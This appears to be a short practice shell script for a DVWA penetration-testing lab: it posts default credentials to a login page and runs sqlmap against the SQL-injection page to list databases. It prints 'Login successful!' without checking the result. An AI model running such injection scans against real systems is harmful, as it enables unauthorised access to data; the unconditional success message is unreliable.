echo "DVWA login automation..."

username="admin"
password="password"
website_url="https://pentest-ground.com:4280/login.php"

curl -X POST -d "username=$username&password=$password" $website_url

echo "Login successful!"

sqlmap -u https://pentest-ground.com:4280/vulnerabilities/sqli/?id=1 --dbs 